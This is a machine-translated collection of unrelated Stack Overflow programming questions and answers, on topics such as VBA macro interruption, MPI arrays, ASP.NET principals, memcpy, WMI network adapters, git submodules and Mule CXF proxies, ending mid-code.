尽管这是一个老问题，但我刚刚遇到了同样的问题并发现它`Ctrl+Scroll lock`可以作为一个休息时间。

“滚动锁定”可以在我的戴尔笔记本电脑上通过蓝色功能键“Fn”和“F6”键访问，该键上有一个带有⇳符号的蓝色小锁符号。在其他计算机上，它可能看起来像 ⤓ 。因此，我有效地按了 Ctrl+Fn+F6。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2018-10-29T13:04:41.657

我有一台惠普笔记本电脑，当我想在 msgbox 之后中断时，这可以工作，按住 fn+ctrl 并单击右 shift 键（也有暂停）然后响应 msgbox 并且代码将中断。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2014-09-17T23:43:45.497

至少在我的戴尔上： ctrl + alt + esc 在光标开始循环之前

我在这个网站上从 aidangrogan 那里得到了这个信息：

[http://en.community.dell.com/support-forums/laptop/f/3518/t/19355018](http://en.community.dell.com/support-forums/laptop/f/3518/t/19355018)

所以我不声称自己找到了它。他（或她）的所有学分

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-04-25T22:12:24.210

按住`CTRL`+`Fn`并点击`Shift`- 停止我的宏运行。我的 HP Pavilion G7 的键盘上也没有“Break”键。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-06-04T21:43:55.687

`Ctrl`+ `Fn`+`B`适用于我的 Dell Latitude 5480（无 `Break`密钥）上的 Excel 365 (Office 365)。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-05-28T04:18:33.477

我找到了这个帖子并看到了得票最多的解决方案，但后来意识到我的笔记本电脑没有`Pause`,`Break`或`ScrLk)`键。我尝试了其他建议的解决方案，例如“屏幕键盘”或替代键组合，但这些也不起作用。

**然后它击中了我：如果它是与特定代码行相关的幻象断点，为什么不干脆去掉这些行？**

所以这就是我所做的：

1.  我切断了执行中断的行。
2.  再次运行宏（这次没有中断）
3.  再次粘贴行。

当没有其他组合键（屏幕上或物理）起作用时，它对我有用。希望它可以帮助某人！

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2018-04-10T14:50:10.233

以上答案都不适合我。

我是怎么发现[这个](https://social.msdn.microsoft.com/Forums/en-US/b3cfa41d-a71a-4941-8531-fac20ab4bd5b/shortcut-to-stop-code-exectuion?forum=isvvba)的，它并不完美，因为你需要`ALT`按住然后按两次键。最重要的是，这取决于您的 Excel 设置的语言。

在英语 Excel 中，您将使用`ALT`++在德语中您需要使用+ `R`+`R``ALT``U``R`

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2018-05-10T02:53:50.993

我有一个日文布局键盘。我的笔记本电脑联想 E470 上既没有滚动锁定也没有中断。长按**Esc**键对我来说是一个终结者。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2018-12-17T12:31:39.580

我找到了解决方法，打开另一个 Excel 实例和另一个电子表格，然后从那里打开 VBA 编辑器，它显示为“正在运行”，所以我可以单击停止按钮

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-02-12T23:26:44.687

因为以上所有内容都不适用于我的应用程序，所以我最终编写了一个可以从终端运行的 VBS 脚本。不优雅。如果其他人工作，可能不是第一选择。但是，有效。

> `break.vbs`

```
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.SendKeys "^%{BREAK}" 
```

# c++ - 如何使用 MPI 在不同的处理器上使用相同的阵列

> ID：10114449
> 
> 赞同：0
> 
> 时间：2012-04-11T21:45:45.263
> 
> 标签：c++, c, fortran, fortran90, openmpi

我希望`hist(1:1000)`使用 OpenMPI 在不同的处理器上调用相同的数组，这样当一个处理器修改`hist`此修改时，其余处理器中就会更新。

我已经编写了代码并声明`hist(1:1000)`了但问题是`hist`在每个处理器上独立更新，然后我所做的是将数据发送到“主节点”以便根据从站的信息更新另一个直方图，但这是我不想要什么。我想在每个处理器上更新相同的直方图。

是否可以使用 OpenMPI 做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T23:35:26.053

据我所知，MPI 不可能做到这一点。MPI 的目的是实现从一个进程到另一个进程的消息传递（因此得名——消息传递接口）。如果你想使用共享内存，最好的办法是使用 OpenMP 之类的东西（我认为它可能在那里？），它至少受到 gcc/gfortran 和可能许多其他编译器的支持。你可以使用线程......但是，最终，这些都不能扩展到像 MPI 这样的 1000 个处理器。根据你在做什么，你可以尝试 MPI 的集体操作——正如你所提到的， hist 正在存储一个直方图，所以你可能只想要你正在使用的所有 hist 的总和，而你的计算实际上并不依赖于历史。MPI 可以在更改所有数组后为您求和...

例如看这个

[http://mpi.deino.net/mpi_functions/MPI_Allreduce.html](http://mpi.deino.net/mpi_functions/MPI_Allreduce.html)

（你想要的操作大概是MPI_SUM）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T23:46:23.683

我不完全了解您的应用程序，但您可能对 MPI_Bcast 函数感兴趣，它将向您的所有处理器广播一个数组。但是，使用大量 MPI_Bcast 通常不是一个好主意，因为很长一段时间将用于通信而不是处理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-12T22:33:31.500

[您可以在单向](http://www.mpi-forum.org/docs/mpi-2.2/mpi22-report/node228.htm)通信的帮助下与其他人共享一个进程上的数组。然而，这被许多人视为次优解决方案。也许你会更好，重新考虑你的算法并尝试更多地按照消息传递范式来制定它。

# asp.net-mvc - 您可以将 RolePrincipal 包装在自定义 IPrincipal 对象中吗？

> ID：10114451
> 
> 赞同：4
> 
> 时间：2012-04-11T21:45:46.947
> 
> 标签：asp.net-mvc, asp.net-membership, wrapper, iprincipal

我在带有表单身份验证的 ASP.NET 框架内使用自定义成员资格和角色提供程序。这些工作很好。角色提供者使用 cookie 来持久化角色，从而在每个 Web 请求上保存到数据库的行程。我还在 FormsAuthenticationTicket 中使用 UserData 字符串来存储 UserId。

我需要将我的 DAL 从 Web 项目中重构为自己的项目。DAL 依赖于检索当前用户的 ID 以及检查角色的权限。我的身份验证系统应该如何更改，以便我可以使用 Thread.CurrentPrincipal 而无需在 DAL 项目中引用 System.Web？

目前，Provider Framework 创建一个 RolePrincipal 和 FormsIdentity 对象并将其附加到 Thread.CurrentPrincipal。

我考虑过在 Application_PostAuthenticateRequest 事件期间围绕 RolePrincipal 创建一个自定义 IPrincipal 包装器。在这种情况下，我可以从 FormsAuthenticalTicket 中获取 UserID，并将其与 RolePrincipal 一起传递给这个新的 wrapperPrincipal。

这是一种有效的方法吗？我最终会因为弄乱 Provider 结构而在项目中导致一些问题吗？

谢谢你，基思

```
protected void Application_PostAuthenticateRequest()
{
    if (Request.IsAuthenticated)
    {
        FormsIdentity identity = (FormsIdentity)User.Identity;

        if (identity != null)
        {
            FormsAuthenticationTicket ticket = identity.Ticket;

            int id = 1;

            if (identity != null)
            {
                int.TryParse(identity.Ticket.UserData, out id);
            }

            var wrapperPrincipal = new WrapperPrincipal(User, id);
            System.Threading.Thread.CurrentPrincipal = WrapperPrincipal;
        }
    }
}   

[Serializable]
public class WrapperPrincipal : IPrincipal
{        
    private IPrincipal principal;

    public WrapperPrincipal(IPrincipal principal, int userId)
    {
        this.principal = principal;
        this.Id = userId;
    }

    public int Id { get; set; }

    public IIdentity Identity
    {
        get { return principal.Identity; }
    }

    public bool IsInRole(string role)
    {
        return principal.IsInRole(role);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-01T19:52:07.087

我最近在尝试实现自定义主体时也遇到了这个问题。我也做了包装，我认为它是有效的。它与 ASP.NET MVC 中的 LukeP 的方法完美配合[- 设置自定义 IIdentity 或 IPrincipal](https://stackoverflow.com/questions/1064271/asp-net-mvc-set-custom-iidentity-or-iprincipal)。你不能弄乱任何东西，因为它只是包装器，你只是删除原始主要成员，你甚至不碰它。我称之为聪明的解决方案。

# c++ - 如何使用 memcpy 将数据从两个整数复制到字符数组？

> ID：10114453
> 
> 赞同：5
> 
> 时间：2012-04-11T21:45:58.507
> 
> 标签：c++, memcpy

我有一个最多可以存储 8 个字节数据的文件。

我有一个系统（我们称之为 Sys1），它可以从文件中获取 8 个字节并将其保存在 ram 内的缓冲区中。

我可以使用这 8 个字节并在其中复制一些内容，然后使用这个系统说“好的，我已经完成了，只需将这些数据发送回文件”。

我想将 8 个字节带入缓冲区，将一个整数复制到其中，这需要 4 个字节，然后在剩余的 4 个字节上复制另一个整数。我只想要 8 个字节的两个整数，我相信这是可以做到的。

我设法只复制了 4 个字节，这只是 1 个整数，并设法将其发送回文件。所以我有这样的事情：

```
 char *data;
     sys1.bring_the_8_bytes(&data);
    //now the 8 bytes are in the buffer,
    // data points to the first byte of the 8 byte  sequence
    int firstInteger = 10;
    int secondInteger = 20;
    //the two integers 
    memcpy(data,&firstInteger,sizeof(int));
    //now the values of the first integer have been copied successfully.
    sys1.send_the_8_bytes_back(); 
```

现在这工作正常！但是我不确定如何复制第一个整数，然后立即复制第二个。

我实际上应该知道第一个字节的地址正好在第一个整数占用的最后一个字节之后，然后在 memcpy 调用中将此地址用作目标地址，我的想法是否正确？如是，

我怎样才能做到这一点？我怎样才能找到我想要的这个地址？

提前致谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T21:50:18.143

您在计算时遇到问题的地址只是`sizeof(int)`您已经拥有的数据指针的字节数。您可以将其`char*`转换为 an`int*`并使用该视图，因为您知道您始终有一个有效的 8 字节区域可以写入。

```
char *data;
sys1.bring_the_8_bytes(&data);
int *tmp = (int*)data;
tmp[0] = 10;
tmp[1] = 20; 
```

或者您可以添加到`char*`(add `sizeof(int)`) 并执行第二个`memcpy`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T21:50:09.610

你在追求这样的事情吗？

```
memcpy(data + sizeof(int), &secondInteger, sizeof(int)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-12T13:43:14.967

如果您不介意数组并想在一次调用中完成，我建议您将两个整数都复制到一个 int 数组中，然后写入文件。

# iis-7 - 405 - IIS7 不允许用于访问此页面的 HTTP 谓词

> ID：10114454
> 
> 赞同：3
> 
> 时间：2012-04-11T21:46:04.320
> 
> 标签：iis-7

我已经在具有 IIS7 的网络服务器上部署了一个 asp.net 应用程序。在我开始浏览 URL [https://testing123.test.com/mywebsite/之后](https://testing123.test.com/mywebsite/)

在 IIS7 的默认文档部分，我将 Default.aspx 设置为默认登录页面。

我尝试了以下网址：

[https://testing123.test.com/mywebsite/Default.aspx](https://testing123.test.com/mywebsite/Default.aspx)

在上述两种情况下，我都收到以下错误：

```
405 - HTTP verb used to access this page is not allowed.
The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access. 
```

谁能帮我解决这个问题？

# c# - 通过 WMI 确定网络适配器类型

> ID：10114455
> 
> 赞同：11
> 
> 时间：2012-04-11T21:46:04.310
> 
> 标签：c#, .net, wmi, wmi-query

我正在使用 WMI (Win32_NetworkAdapter) 并尝试获取连接的有线或无线物理网络适配器的详细信息，并避免使用虚拟适配器等。

阅读[这篇文章](http://weblogs.sqlteam.com/mladenp/archive/2010/11/04/find-only-physical-network-adapters-with-wmi-win32_networkadapter-class.aspx)，它解释了您必须对 WMI 进行一些巧妙的查询，以消除虚拟适配器并尝试仅返回真实的物理适配器。

阅读[这篇文章](http://www.mombu.com/microsoft/win32-programmer-wmi/t-is-network-adapter-wireless-346835.html)，它解释说您可以比较网络适配器的“描述”中的文本，看看它是否包括“无线”、“802.11”或“WLAN”，如果有，那么很可能适配器是无线的适配器。

随着今天的 .Net 版本和其他改进，在 Windows XP+ 上确定网络适配器是有线还是无线以及不是来自 VM 软件等的虚拟适配器真的只有这两种方法吗？如果不是，请解释。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2017-08-17T13:01:17.977

您可以在**“root\StandardCimv2”**命名空间中使用新的 WMI 类**MSFT_NetAdapter**。此类是在**Windows 8**中引入的。

 ****我们可以使用属性**ConnectorPresent**仅过滤到物理适配器。接下来我们必须消除 Wi-Fi 适配器（存在于物理适配器中），我们可以使用**InterfaceType**和/或**NdisPhysicalMedium**属性。

**InterfaceType**由 Internet 名称分配机构 (IANA) 定义，对于所有类似以太网的接口，其值为**ethernetCsmacd (6)**（参见[https://www.iana.org/assignments/ianaiftype-mib/ianaiftype-mib](https://www.iana.org/assignments/ianaiftype-mib/ianaiftype-mib)）。

在**NdisPhysicalMedium**中，以太网适配器的值为**0**或**802.3 (14)**。

所以我在 C# 中的解决方案是：

```
try
{
    var objectSearcher = new ManagementObjectSearcher("root\\StandardCimv2", $@"select Name, InterfaceName, InterfaceType, NdisPhysicalMedium from MSFT_NetAdapter where ConnectorPresent=1"); //Physical adapter

    int count = 0;
    foreach (var managementObject in objectSearcher.Get())
    {
        //The locally unique identifier for the network interface. in InterfaceType_NetluidIndex format. Ex: Ethernet_2.
        string interfaceName = managementObject["InterfaceName"]?.ToString();
        //The interface type as defined by the Internet Assigned Names Authority (IANA).
        //https://www.iana.org/assignments/ianaiftype-mib/ianaiftype-mib
        UInt32 interfaceType = Convert.ToUInt32(managementObject["InterfaceType"]);
        //The types of physical media that the network adapter supports.
        UInt32 ndisPhysicalMedium = Convert.ToUInt32(managementObject["NdisPhysicalMedium"]);

        if (!string.IsNullOrEmpty(interfaceName) &&
            interfaceType == 6 &&       //ethernetCsmacd(6) --for all ethernet-like interfaces, regardless of speed, as per RFC3635
            (ndisPhysicalMedium == 0 || ndisPhysicalMedium == 14))   //802.3
        {
            count++;
        }
    }

    return count;
}
catch (ManagementException)
{
    //Run-time requirements WMI MSFT_NetAdapter class is included in Windows 8 and Windows Server 2012
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-06-11T16:31:48.823

我看到这是一个老问题，但我在互联网上的[其他地方找到了一个答案](http://blogs.technet.com/b/heyscriptingguy/archive/2014/01/12/weekend-scripter-use-powershell-to-identify-network-adapter-characteristics.aspx#comments)，它描述了如何做到这一点（一直向下滚动到评论）。

评论者的技术允许识别 WiFi 和蓝牙接口，其中所有其他类型可以组合在一起。如果目标只是将 WiFi 与以太网适配器分开，那应该就足够了。

查询是（Powershell 示例）：

```
$nics = Get-WmiObject -Namespace "root/CIMV2" -Query "SELECT * FROM Win32_NetworkAdapter"
$types = Get-WmiObject -Namespace "root/WMI" -Query "SELECT * FROM MSNdis_PhysicalMediumType" 
```

第一个查询是提供适配器列表的常用方法。如前所述，可以通过许多其他选择标准将其过滤为仅包括有效的物理设备。

第二个查询返回一个带有`NdisPhysicalMediumType`属性的 WMI 对象，根据链接的站点，WiFi的值为**9**，蓝牙的值为**10 ，以太网和大多数其他适配器类型的****值为 0**。

看起来连接这两个查询必须使用第一个查询的`Name`or`Description`属性和`InstanceName`第二个查询的属性在脚本中手动完成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-04-26T13:25:20.740

```
select * from Win32_NetworkAdapter where NetConnectionID LIKE "%Wireless%" or NetConnectionID LIKE "%Wi-Fi%" 
```****

# git - 不可能让根子模块在 Git 上工作

> ID：10114456
> 
> 赞同：1
> 
> 时间：2012-04-11T21:46:05.987
> 
> 标签：git, github, git-submodules

我已经在我的存储库根目录中的特定文件夹中创建了一个子模块。

我可以看到子模块已在 .git/.gitmodules 和 .gitmodules 中很好地注册，但我无法让它工作。

如果我创建 git 子模块状态或进行更新，我看不到它。

Git 不能只看到这个子模块（其他的运行良好）。

你有什么踪迹吗？

谢谢你的时间

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T12:34:53.723

一个想法 - 您正在尝试添加一个空仓库作为子模块。您需要在子模块中至少有一个提交，因为它是通过提交 ID 链接的。尝试在根 repo 中执行此命令：

```
git ls-tree HEAD -r 
```

您在结果中看到您的子模块吗？该行应如下所示：

```
160000 commit 72a0f63227341c35af566de0d6d4a76797ba22b2  my_submodule_dir 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-17T11:27:29.117

无论我做什么，Git 都无法识别子模块。

没有任何修改，我只是：

1.  删除子模块文件夹
2.  添加子模块

子模块现在可以正常工作。

请注意，Git 没有添加新的子模块，他只是按应有的方式识别子模块。

感谢您的所有回答

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-05-23T19:57:06.740

git submmodule status 没有看到（完全）子模块的另一种情况是刚刚创建了所述子模块（初始化，但尚未更新）

这是有问题的，因为 Git 2.18（2018 年第二季度）修复了一个错误：“ `git submodule status`”没有检查它为子模块 HEAD 计算的符号修订名称不是 NULL，并将其扔到`printf`例程中，这已得到纠正。

请参阅[Nguyễn Thái Ngọc Duy ( ) 的](https://github.com/pclouds)[提交 0b5e2ea](https://github.com/git/git/commit/0b5e2ea7cf3b0fd0f4339b7c8b69cb8c5853c0cd)（2018 年 4 月 18 日[）](https://github.com/pclouds)。^(（由)^([Junio C Hamano 合并 --](https://github.com/gitster)) ^([--](https://github.com/gitster))^在^([0cd58d8 提交中](https://github.com/git/git/commit/0cd58d8ba9aa562dd3c039af9565f61a14da03b8))^(，2018 年 5 月 8 日）)[`pclouds`](https://github.com/pclouds)
^([`gitster`](https://github.com/gitster))

> ## `submodule--helper`: 不要`null`在 ' `submodule status`'中打印
> 
> 该函数有时`compute_rev_name()`会返回`NULL`（例如，在' `submodule init`'之后）。
> 当前代码使 ' `submodule status`' 打印：
> 
> ```
> 19d97bf5af05312267c2e874ee6bcf584d9e9681 sha1collisiondetection ((null)) 
> ```
> 
> 这个丑陋的 ' `null`' 对使用此命令的用户没有任何价值。
> 更重要的是，`printf()`在某些平台上无法将 NULL 作为字符串处理，并且会崩溃而不是打印 ' `(null)`'。
> 
> 检查这一点并跳过打印这部分（替代方法是打印' `(n/a)`'或其他东西，但我认为这只是噪音）。

# php - 比较不同表中的2个Mysql列并删除

> ID：10114458
> 
> 赞同：0
> 
> 时间：2012-04-11T21:46:14.450
> 
> 标签：php, mysql, compare

好的，所以我的问题是

我有一个支持自动上架的拍卖网站，但是当拍卖自动上架时，它不会清除旧条目，所以我打算编写一些 php 代码并将其作为 cronjob 运行以清除 2 天后的条目或因此，被引用的表是 probid_auctions 和 probid_auction_media 列是auction_id，我想将 probid_auction_media 中的auction_id 列与 probid_auctions 中的auction_id 列进行比较，并删除 probid_auction_media 中不匹配的任何条目

现在测试这个

```
mysql_connect($host, $username, $password);
mysql_select_db("b1396hos_database1") or die( "Unable to select database");
$db->query("DELETE * FROM  probid_auction_media 
WHERE auction_id NOT IN (SELECT DISTINCT auction_id FROM probid_auctions"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:49:15.133

```
DELETE FROM probid_auction_media 
WHERE auction_id NOT IN (SELECT DISTINCT auction_id FROM probid_auctions); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T06:21:11.623

使用这样的查询

```
DELETE
FROM probid_auction_media
WHERE auction_id NOT IN(SELECT
                      probid_auction_media.auction_id
                    FROM probid_auctions,
                      probid_auction_media
                    where probid_auctions.auction_id != probid_auction_media.auction_id); 
```

# silverlight - Silverlight 5 打印乱码报告

> ID：10114460
> 
> 赞同：0
> 
> 时间：2012-04-11T21:46:19.163
> 
> 标签：silverlight, printing, crystal-reports, silverlight-5.0, componentone

我正在使用 C1ReportViewer 控件，并且已经在 C1 论坛上发布了一个问题，但是我想我也会在这里发布，看看是否有人遇到过类似的问题。该控件使用通用silverlight PrintDocument() 方法。

在 Silverlight 5 中从该控件打印 Crystal 报表时，有时报表打印出乱码，这意味着不同大小的文本、锥形线条并且通常位置不正确。它也很少打印整个报告。

我已将问题缩小到几台打印机，并且仅限于使用其 32 位驱动程序的机器。基于此，以及对 Silverlight 5 所做的更改，我假设问题与 PostScript 兼容性有关。但是，由于我们的产品是 LOB 应用程序，因此执行 PS 兼容的打印机和打印机驱动程序几乎是不可能的。

因此，如果这确实是后期脚本问题，则根据 silverlight 5 的文档，PrintDocument() 方法应该故障恢复为默认位图方法。请参阅[我是否正确理解 SilverLight 5 中的矢量打印仅适用于 Postscript 打印机？](https://stackoverflow.com/questions/7334980/am-i-correct-in-understanding-that-vector-printing-in-silverlight-5-will-only-wo)

我对 stackoverflow 的问题是：有没有人在 Silverlight 5 中打印时遇到过类似的问题，或者有没有人成功打印 Crystal Reports/PDF？如果有人有机会，你想出了什么解决方案？

非常感激，

格雷格

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T14:03:01.673

我能够为此提出解决方案。我可以编写一些代码来强制位图打印，而不是使用内置的 C1 打印功能。

首先，我创建了一个新的 PrintDocument，并为其 PrintPage 事件连接了一些处理程序。

```
mobjPrintDocument = New PrintDocument
RemoveHandler mobjPrintDocument.PrintPage, AddressOf Print_Report
AddHandler mobjPrintDocument.PrintPage, AddressOf Print_Report 
```

然后我们可以在需要打印的任何时候调用 PrintDocument 上的 PrintBitmap 函数。当用户单击“打印”按钮时，我正在执行此操作。

```
 Private Sub xbtnPrint_Click(sender As System.Object, e As System.Windows.RoutedEventArgs)
    mintPageIndex = 0
    mobjPrintDocument.PrintBitmap(FileName)
  End Sub 
```

现在是重要的部分。我们可以通过挂钩 PrintPage 事件来劫持目标内容（如上所述）。我可以将 e.PageVisual 设置为任何可视 xaml 元素，PrintBitmap 将处理它。在这里，我使用 GetPages 函数并循环以确保打印每一页（一个 pdfviewer 元素）。但是，您可以将它指向我所说的任何视觉元素。

```
 Private Sub Print_Report(sender As System.Object, e As PrintPageEventArgs)
    e.PageVisual = xobjReportViewer.GetPages(mintPageIndex)
    mintPageIndex += 1
    e.HasMorePages = mintPageIndex < xobjReportViewer.GetPages.Count
  End Sub 
```

e.HasMorePages 允许您强制触发此事件，直到您完成。

希望这对某人有帮助。借助 Silverlight 5 和 Post-Script 打印机支持，许多具有 PostScript 仿真器的打印机可能不兼容，但也不会默认为位图打印。此解决方法解决了该问题，使 LOB 类型应用程序中的打印更加稳定。

# soap - Mule 中的 CXF Web 服务代理配置问题

> ID：10114462
> 
> 赞同：1
> 
> 时间：2012-04-11T21:46:25.850
> 
> 标签：soap, cxf, mule

现在，我有一个名为 ProcessPayment 的服务，它调用一个计费系统。正如我们在此处看到的，我想从我的支付服务调用另一个计费服务。PaymentService 的响应包含 3 个数据元素。BillingService 中需要其中之一。

如何在 Mule 中为两个或多个服务配置流？我尝试了各种排列，但它不起作用！

**骡配置.xml**

```
 <?xml version="1.0" encoding="UTF-8"?>
<mule xmlns="http://www.mulesoft.org/schema/mule/core" xmlns:cxf="http://www.mulesoft.org/schema/mule/cxf"
    xmlns:doc="http://www.mulesoft.org/schema/mule/documentation"
    xmlns:spring="http://www.springframework.org/schema/beans" xmlns:core="http://www.mulesoft.org/schema/mule/core"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:http="http://www.mulesoft.org/schema/mule/http"
    xmlns:ognl="http://www.mulesoft.org/schema/mule/ognl" xmlns:servlet="http://www.mulesoft.org/schema/mule/servlet"
    xmlns:vm="http://www.mulesoft.org/schema/mule/vm" xmlns:pattern="http://www.mulesoft.org/schema/mule/pattern"
    xsi:schemaLocation="
        http://www.mulesoft.org/schema/mule/core http://www.mulesoft.org/schema/mule/core/3.1/mule.xsd
        http://www.mulesoft.org/schema/mule/pattern http://www.mulesoft.org/schema/mule/pattern/3.1/mule-pattern.xsd
        http://www.mulesoft.org/schema/mule/cxf http://www.mulesoft.org/schema/mule/cxf/current/mule-cxf.xsd 
        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd 
        http://www.mulesoft.org/schema/mule/http http://www.mulesoft.org/schema/mule/http/current/mule-http.xsd 
        http://www.mulesoft.org/schema/mule/ognl http://www.mulesoft.org/schema/mule/ognl/current/mule-ognl.xsd 
        http://www.mulesoft.org/schema/mule/vm http://www.mulesoft.org/schema/mule/vm/current/mule-vm.xsd">

    <!-- <flow name="parallelservices"> <all enableCorrelation="ALWAYS"> <cxf:proxy-service 
        wsdlLocation="classpath:billingservice.wsdl" bindingId="BillingServiceServiceSoapBinding" 
        port="BillingServicePort" service="BillingServiceService" payload="body" 
        namespace="http://com.myapp.demo/" /> </all> </flow> -->

    <flow name="initpayment">
        <inbound-endpoint address="http://localhost:8585/services/processpayment">
            <cxf:proxy-service wsdlLocation="classpath:processpaymentservice.wsdl"
                bindingId="ProcessPaymentServiceServiceSoapBinding" service="ProcessPaymentServiceService"
                payload="body" namespace="http://com.myapp.demo/" />
        </inbound-endpoint>
        <outbound-endpoint address="http://localhost:8081/BillingEntry/services/BillingServicePort">
            <!-- <flow-ref name="parallelservices" /> -->
            <cxf:proxy-client/>
        </outbound-endpoint>
    </flow>

</mule> 
```

**处理付款wsdl**

```
<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions name="ProcessPaymentServiceService" targetNamespace="http://processpayment.icp.sf/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:tns="http://com.myapp.demo/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
  <wsdl:types>
    <schema xmlns="http://www.w3.org/2001/XMLSchema">
<import namespace="http://processpayment.icp.sf/" schemaLocation="processpaymentservice_schema1.xsd"/>
</schema>
  </wsdl:types>
  <wsdl:message name="processPayment">
    <wsdl:part name="parameters" element="tns:processPayment">
    </wsdl:part>
  </wsdl:message>
  <wsdl:message name="processPaymentResponse">
    <wsdl:part name="parameters" element="tns:processPaymentResponse">
    </wsdl:part>
  </wsdl:message>
  <wsdl:portType name="IProcessPayment">
    <wsdl:operation name="processPayment">
      <wsdl:input name="processPayment" message="tns:processPayment">
    </wsdl:input>
      <wsdl:output name="processPaymentResponse" message="tns:processPaymentResponse">
    </wsdl:output>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="ProcessPaymentServiceServiceSoapBinding" type="tns:IProcessPayment">
    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="processPayment">
      <soap:operation soapAction="" style="document"/>
      <wsdl:input name="processPayment">
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output name="processPaymentResponse">
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="ProcessPaymentServiceService">
    <wsdl:port name="ProcessPaymentServicePort" binding="tns:ProcessPaymentServiceServiceSoapBinding">
      <soap:address location="http://localhost:8081/ProcessPayment/services/ProcessPaymentServicePort"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions> 
```

**计费服务 wsdl**

```
<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions name="BillingServiceService" targetNamespace="http://com.myapp.demo2/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:tns="http://billing.icp.sf/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
  <wsdl:types>
    <schema xmlns="http://www.w3.org/2001/XMLSchema">
<import namespace="http://billing.icp.sf/" schemaLocation="billingservice_schema1.xsd"/>
</schema>
  </wsdl:types>
  <wsdl:message name="billingEntryResponse">
    <wsdl:part name="parameters" element="tns:billingEntryResponse">
    </wsdl:part>
  </wsdl:message>
  <wsdl:message name="billingEntry">
    <wsdl:part name="parameters" element="tns:billingEntry">
    </wsdl:part>
  </wsdl:message>
  <wsdl:portType name="IBillingService">
    <wsdl:operation name="billingEntry">
      <wsdl:input name="billingEntry" message="tns:billingEntry">
    </wsdl:input>
      <wsdl:output name="billingEntryResponse" message="tns:billingEntryResponse">
    </wsdl:output>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="BillingServiceServiceSoapBinding" type="tns:IBillingService">
    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="billingEntry">
      <soap:operation soapAction="" style="document"/>
      <wsdl:input name="billingEntry">
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output name="billingEntryResponse">
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="BillingServiceService">
    <wsdl:port name="BillingServicePort" binding="tns:BillingServiceServiceSoapBinding">
      <soap:address location="http://localhost:8081/BillingEntry/services/BillingServicePort"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions> 
```

**即时问题**

当我点击 Mule 配置入站 URL 时，我能够为 ProcessPayment 服务生成 wsdl。但它显示了修改后的值

```
 <import schemaLocation="".../> 
```

和

```
 <wsdl:port><soap:address>*****</soap:address></wsdl:port> 
```

使用此 URL，我无法在 SOAPui 上测试服务。但是当我点击服务原始地址而不是 Mule 入站地址时，我得到了我的实际服务。它也在 SOAP UI 中运行。

**快速提问：**

如何执行流程？简单地从浏览器或 SOAPui 调用入站 URL 行不通？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T00:39:28.587

在这里，我创建了一个示例，演示如何使用 CXF 代理执行 SOAP 信封级别操作。从那里我确信您可以扩展和构建您需要的任何东西。

请注意：

*   不需要生成代码，实际上我必须删除您生成的类，否则它不起作用。这种带有 WSDL+XSD 的单一 XML 配置就足够了。
*   我已经限定了 Mule 核心元素，以避免在默认命名空间中生成的元素 XSL-T 最终出现在 Mule 核心命名空间中。如果您将 XSL 片段外部化，则不需要这样做。
*   （人为的）示例公开了 processpaymentservice.wsdl。它获取 paymentType_req 的值，假装它是一个 IP 地址并使用它来调用[http://www.webservicex.net/geoipservice.asmx](http://www.webservicex.net/geoipservice.asmx)。然后将地理定位的国家名称用作流程支付响应的 paymentType_res 元素的值（其他 2 个值是伪造的）。
*   使用soapUI 4.5 和Mule 3.2.1 测试。

享受！

```
<mule:flow name="processPaymentServiceOrchestration">
    <http:inbound-endpoint address="http://localhost:8080/ppso"
        exchange-pattern="request-response">
        <cxf:proxy-service wsdlLocation="classpath:processpaymentservice.wsdl"
            service="ProcessPaymentServiceService" namespace="http://processpayment.icp.sf/" />
